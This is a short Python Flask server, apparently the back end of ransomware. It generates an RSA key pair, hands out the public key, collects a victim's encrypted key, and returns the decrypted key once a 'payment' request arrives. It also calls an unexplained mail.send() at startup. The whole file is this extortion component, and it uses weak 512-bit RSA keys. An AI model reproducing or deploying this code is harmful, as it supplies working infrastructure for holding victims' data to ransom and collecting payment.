from flask import Flask, request
import rsa
import mail

app = Flask(__name__)


def generate_key_pair():
    (public_key, private_key) = rsa.newkeys(512)
    return public_key, private_key
    

public_key, private_key = generate_key_pair()
# save the keys to file
with open('public_key.pem', 'wb') as f:
    f.write(public_key.save_pkcs1())
with open('private_key.pem', 'wb') as f:
    f.write(private_key.save_pkcs1())
with open('keypair.key', 'wb') as f:
    f.write(private_key.save_pkcs1())
    f.write(public_key.save_pkcs1())


encypted_key = None



@app.route('/receive_encryptedKey', methods=['POST'])
def receive_encryptedKey():
    global encypted_key
    encypted_key = request.form.get('data')
    print(type(encypted_key))
    print("Received:", encypted_key)
    return "Encrypted key received by server!"


def decrypt_key(encypted_key, private_key):
    encypted_key = bytes.fromhex(encypted_key)
    key = rsa.decrypt(encypted_key, private_key)
    
    return key


@app.route('/send_public_key', methods=['GET'])
def send_public_key():
    return public_key.save_pkcs1()

@app.route('/payment', methods=['POST'])
def payment():
    global encypted_key,private_key
    pay = request.form.get('data')
    print("Received:", pay)
    if(pay!=None):
        key=decrypt_key(encypted_key, private_key)
        return key



    return "payment received by server!"


if __name__ == '__main__':
    mail.send()
    app.run(host='0.0.0.0', port=12345)
